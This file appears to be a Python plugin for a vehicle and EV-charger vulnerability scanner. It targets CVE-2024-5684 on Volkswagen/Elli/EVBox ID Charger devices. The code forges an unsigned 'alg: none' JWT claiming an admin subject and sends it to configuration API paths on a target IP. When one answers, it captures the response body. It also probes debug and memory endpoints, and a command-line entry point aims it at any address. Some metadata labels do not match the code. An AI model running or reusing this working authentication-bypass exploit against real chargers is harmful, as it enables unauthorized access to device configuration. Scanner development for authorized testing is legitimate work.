#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
import base64
import json
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 42,
    "cve": "CVE-2024-5684",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Automotive embedded component",
    "component": "车载软件组件",
    "type": "内存安全/配置问题",
    "summary": "ASRG披露的车载组件漏洞，需结合公告复核具体攻击面。",
    "source_description": "An attacker with access to the private network (the charger is connected to) or local access to the Ethernet-Interface can exploit a faulty implementation of the JWT-library in order to bypass the password authentication to the web configuration interface and then has full access as the user would have. However, an attacker will not have developer or admin rights. If the implementation of the JWT-library is wrongly configured to accept \"none\"-algorithms, the server will pass insecure JWT. A local, unauthenticated attacker can exploit this vulnerability to bypass the authentication mechanism.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-5684",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-5684",
        "https://asrg.io/security-advisories/vulnerability-in-id-charger-connect-and-pro-from-volkswagen-group-charging-gmbh-elli-evbox-versions-spr3-2b-spr3-51-and-spr3-52/",
        "https://cveawg.mitre.org/api/cve/CVE-2024-5684"
    ],
    "affected": [
        {
            "vendor": "Volkswagen Group Charging GmbH - Elli, EVBox",
            "product": "ID Charger Connect & Pro",
            "versions": [
                {
                    "version": "SPR3.2B",
                    "status": "affected"
                },
                {
                    "version": "SPR3.51",
                    "status": "affected"
                },
                {
                    "version": "SPR3.52",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-5684",
        "Automotive",
        "embedded",
        "component",
        "access",
        "private",
        "network",
        "charger",
        "connected",
        "local",
        "Ethernet-Interface",
        "exploit",
        "faulty",
        "implementation",
        "JWT-library",
        "order",
        "bypass",
        "password",
        "authentication",
        "configuration",
        "interface",
        "then",
        "full",
        "user",
        "would",
        "have",
        "However",
        "will",
        "Volkswagen Group Charging GmbH - Elli, EVBox",
        "ID Charger Connect & Pro"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2024-5684: VW/Elli charger JWT 'none' algorithm auth bypass."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 80))
    tls = bool(params.get("tls", False))

    evidence = {
        "cve": "CVE-2024-5684",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - JWT none-algorithm auth bypass on EV charger config interface",
    }

    active_port = None
    for try_port in [port, 80, 8080, 443]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    hdr_b64 = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    pay_b64 = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "user"}).encode()).rstrip(b"=").decode()
    jwt_none_token = f"{hdr_b64}.{pay_b64}."
    evidence["jwt_none_token_sample"] = jwt_none_token[:60] + "..."

    bypass_paths = ["/api/v1/user", "/api/config", "/configuration", "/settings", "/api/v1/config"]
    for path in bypass_paths:
        r = probe.request(
            "GET", path,
            extra_headers={"Authorization": f"Bearer {jwt_none_token}"}
        )
        status = r.get("status")
        evidence[f"jwt_none_{path.strip('/').replace('/', '_')}_status"] = status
        if status == 200:
            evidence["jwt_none_bypass_success"] = path
            evidence["bypass_body_preview"] = r.get("body_text", "")[:200]
            return {
                "vulnerable": True,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "jwt_none_bypass_confirmed"),
                "requires_manual_review": False,
            }

    config_paths = ["/config", "/debug", "/memory", "/info", "/status"]
    for path in config_paths:
        r = probe.get(path)
        if r.get("status") == 200:
            evidence["config_path_accessible"] = path
            evidence["config_body_preview"] = r.get("body_text", "")[:200]
            break

    evidence["jwt_bypass_paths_tested"] = bypass_paths
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("B", evidence, "jwt_none_bypass_attempted"),
        "requires_manual_review": True,
    }

class Poc36CVE20245684ExposureAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-042'
    meta_poc_name = 'CVE-2024-5684 配置问题 Active Validation'
    meta_cve_id = 'CVE-2024-5684'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-5684'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2024-5684']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "36_Automotive_Component_Memory_Config_Exposure_Audit") if "VULN" in dir() else "36_Automotive_Component_Memory_Config_Exposure_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc36CVE20245684ExposureAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
